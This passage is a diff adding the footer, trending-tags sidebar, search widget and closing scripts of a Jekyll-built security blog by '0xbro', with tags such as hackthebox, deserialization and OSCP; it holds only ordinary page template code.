+    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
+  "
+>
+  <p>©
+    <time>2026</time>
+
+    
+      <a href="https://github.com/0xb120">0xbro</a>.
+    
+
+    
+      <span
+        data-bs-toggle="tooltip"
+        data-bs-placement="top"
+        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
+      >Some rights reserved.</span>
+    
+  </p>
+
+  <p>
+   Powered by ☕, 🐛🐜🐞, vulnerabilities and exploits
+  </p>
+</footer>
+          </div>
+        </div>
+
+        <!-- The Search results -->
+
+<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
+  <div class="col-11 content">
+    <div id="search-hints">
+      <!-- The trending tags list -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+
+
+  <section>
+    <h2 class="panel-heading">Trending Tags</h2>
+    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/hackthebox/">hackthebox</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/deserialization/">deserialization</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/android/">android</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/php/">PHP</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/interview/">interview</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/oscp/">OSCP</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/podcast/">podcast</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/ato/">ATO</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/hacking-lab/">hacking-lab</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/note-taking/">note-taking</a>
+      
+    </div>
+  </section>
+
+
+    </div>
+    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
+  </div>
+</div>
+
+      </div>
+
+      <aside aria-label="Scroll to Top">
+        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
+          <i class="fas fa-angle-up"></i>
+        </button>
+      </aside>
+    </div>
+
+    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>
+
+    
+      <aside
+  id="notification"
+  class="toast"
+  role="alert"
+  aria-live="assertive"
+  aria-atomic="true"
+  data-bs-animation="true"
+  data-bs-autohide="false"
+>
+  <div class="toast-header">
+    <button
+      type="button"
+      class="btn-close ms-auto"
+      data-bs-dismiss="toast"
+      aria-label="Close"
+    ></button>
+  </div>
+  <div class="toast-body text-center pt-0">
+    <p class="px-2 mb-3">A new version of content is available.</p>
+    <button type="button" class="btn btn-primary" aria-label="Update">
+      Update
+    </button>
+  </div>
+</aside>
+
+    
+
+    <!-- Embedded scripts -->
+
+    
+      
+      <!-- The comments switcher -->
+
+
+    
+
+    <!--
+  Jekyll Simple Search loader
+  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
+-->
+
+
+
+
+
+<script>
+  
+  document.addEventListener('DOMContentLoaded', () => {
+    SimpleJekyllSearch({
+      searchInput: document.getElementById('search-input'),
+      resultsContainer: document.getElementById('search-results'),
+      json: '/assets/js/data/search.json',
+      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{content}</p>  </article>',
+      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
+      templateMiddleware: function(prop, value, template) {
+        if (prop === 'categories') {
+          if (value === '') {
+            return `${value}`;
+          } else {
+            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
+          }
+        }
+
+        if (prop === 'tags') {
+          if (value === '') {
+            return `${value}`;
+          } else {
+            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
+          }
+        }
+      }
+    });
+  });
+</script>
+
+  </body>
+</html>
+
